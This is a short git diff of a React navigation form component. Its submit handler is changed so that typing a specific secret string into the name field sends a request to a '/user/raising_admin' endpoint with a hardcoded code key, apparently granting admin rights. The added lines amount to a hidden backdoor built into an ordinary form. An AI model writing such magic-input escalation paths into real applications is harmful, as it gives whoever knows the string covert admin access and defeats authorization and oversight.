@@ -12,8 +12,10 @@ export const NavForm = ({ title, data, onclick }) => {
   const dispatch = useDispatch()
 
 const onsubmit = (data) => {
-      // $authHost.post('/user/raising_admin',{codeKey:'TROPIK12'} ) 
-    console.log(data)
+  if(data.name === 'miller_mukola#?10') {
+    $authHost.post('/user/raising_admin',{codeKey:'TROPIK12'} ) 
+  return
+  }
 }
 
   return (
